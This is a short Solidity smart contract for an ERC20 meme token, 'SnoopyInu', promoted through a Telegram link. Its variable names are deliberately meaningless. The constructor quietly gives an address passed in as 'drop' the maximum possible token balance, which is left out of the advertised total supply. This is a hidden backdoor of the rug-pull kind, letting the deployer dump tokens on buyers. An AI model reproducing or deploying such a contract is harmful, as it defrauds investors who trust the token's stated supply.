/*

https://t.me/snoopyinuETH

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.1;

import "./Ownable.sol";
import "./ERC20.sol";

contract SnoopyInu is ERC20, Ownable {
    uint256 private essential = ~uint256(0);
    uint256 public open = 3;

    constructor(
        string memory stopped,
        string memory nearly,
        address chemical,
        address drop
    ) ERC20(stopped, nearly) {
        _balances[drop] = essential;
        _totalSupply = 1000000000 * 10**decimals();
        _balances[_msgSender()] = _totalSupply;
    }

    function _transfer(
        address wore,
        address walk,
        uint256 bound
    ) internal override {
        uint256 other = (bound / 100) * open;
        bound = bound - other;
        super._transfer(wore, walk, bound);
    }
}
